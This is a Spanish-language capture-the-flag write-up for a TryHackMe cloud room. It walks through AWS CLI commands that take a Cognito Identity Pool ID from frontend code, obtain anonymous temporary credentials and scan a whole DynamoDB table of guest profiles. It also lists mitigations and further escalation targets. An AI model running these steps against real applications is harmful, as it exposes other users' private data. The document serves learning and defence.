# Writeup: TryHackMe — Hacker Holidays 2026: Complimentary

## Información
- **Plataforma:** TryHackMe
- **Evento:** Hacker Holidays 2026 — The Byte Lotus
- **Room:** Complimentary
- **Tema:** Cloud / AWS / Cognito / DynamoDB
- **Dificultad:** Easy
- **Fecha:** 2026-08-07

## Resumen ejecutivo

Room de cloud que explota una mala configuración en AWS Cognito Identity
Pools. La app wellness otorga credenciales AWS temporales a usuarios no
autenticados, y el rol IAM asociado permite escanear toda la tabla DynamoDB
en lugar de solo el registro propio.

## Conceptos clave

### AWS Cognito Identity Pools

Permiten otorgar credenciales AWS temporales a usuarios anónimos (guests).
El frontend obtiene un `IdentityPoolId`, que se usa para pedir un `IdentityId`
y luego credenciales.

Flujo:

```
IdentityPoolId → get-id → IdentityId
IdentityId → get-credentials-for-identity → AccessKey / SecretKey / SessionToken
```

### IAM misconfiguration

El rol IAM asignado a los usuarios no autenticados permite acciones como
`dynamodb:Scan` sobre toda la tabla, en lugar de restringir con `dynamodb:GetItem`
sobre un registro específico.

### Filttro de condición en DynamoDB

Para limitar el acceso, el rol debería tener una `Condition` como:

```json
"Condition": {
  "ForAllValues:StringEquals": {
    "dynamodb:LeadingKeys": ["${cognito-identity.amazonaws.com:sub}"]
  }
}
```

Esto restringe cada usuario a su propio registro basado en `guest_id`.

## Pasos de la room

### 1. Inspeccionar el frontend

La app aloja el JavaScript en S3. En el código fuente se encuentra:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

### 2. Obtener Identity ID

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1
```

### 3. Obtener credenciales AWS temporales

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id <IDENTITY_ID> \
  --region us-east-1
```

### 4. Configurar AWS CLI

```bash
aws configure set aws_access_key_id <ACCESS_KEY>
aws configure set aws_secret_access_key <SECRET_KEY>
aws configure set aws_session_token <SESSION_TOKEN>
aws configure set region us-east-1
```

### 5. Escanear DynamoDB

El intento de `list-tables` falló por `AccessDeniedException`, pero el rol
permitía `dynamodb:Scan` sobre la tabla conocida:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

### 6. Encontrar la flag

El scan devuelve todos los perfiles de guest. En el campo `notes` de uno de
los registros estaba la flag.

## Errores comunes y lecciones

### Error: `UnrecognizedClientException` con credenciales

El `SessionToken` contiene caracteres especiales que pueden romperse al
exportar. Configurar el AWS CLI con `aws configure set` es más confiable que
variables de entorno para tokens largos.

### Error: `AccessDeniedException` en `dynamodb:ListTables`

Eso es normal si el rol no permite listar tablas. Conocer el nombre exacto
de la tabla (del código fuente) permite usar `dynamodb:Scan` directamente.

### Error: asumir que los usuarios anónimos no tienen privilegios

Un Identity Pool mal configurado puede dar acceso a recursos sensibles sin
ninguna autenticación.

## Variantes y uso real

- **S3 bucket enumeration** con credenciales de Cognito.
- **Lambda invocation** si el rol permite `lambda:InvokeFunction`.
- **CloudWatch logs** si el rol permite `logs:FilterLogEvents`.
- **SSM Parameter Store** si el rol permite `ssm:GetParameter`.
- **Escalation desde Cognito Identity Pool a otros servicios** según las
  políticas del rol.

## Mitigaciones

1. **Restringir acciones IAM:** no usar `dynamodb:*` ni `s3:*` para usuarios
   no autenticados.
2. **Usar `dynamodb:LeadingKeys`:** limitar cada usuario a su propio registro.
3. **No exponer `IdentityPoolId` de manera innecesaria:** aunque sea difícil
   evitarlo en frontend, la seguridad debe estar en el rol IAM.
4. **Auditar roles de Cognito regularmente:** revisar qué acciones permiten.
5. **Principio de mínimo privilegio:** los usuarios anónimos solo deberían
   poder escribir/leer su propio registro.

## Herramientas usadas

- Navegador + DevTools para inspeccionar el frontend.
- `aws cognito-identity` para obtener credenciales.
- `aws dynamodb scan` para leer la tabla.

## Material de referencia

- AWS Cognito Identity Pools documentation.
- AWS DynamoDB IAM access control.
- OWASP Top 10 2021 — A01 Broken Access Control.
- TryHackMe Hacker Holidays 2026.

## Autoevaluación

1. ¿Qué es un AWS Cognito Identity Pool?
2. ¿Cómo se obtienen credenciales temporales a partir de un `IdentityPoolId`?
3. ¿Por qué el intento de `ListTables` falló pero `Scan` funcionó?
4. ¿Qué política IAM evitaría que un guest lea perfiles ajenos?
5. Nombra tres servicios de AWS que podrías explotar si el rol de Cognito
   permite acceso.
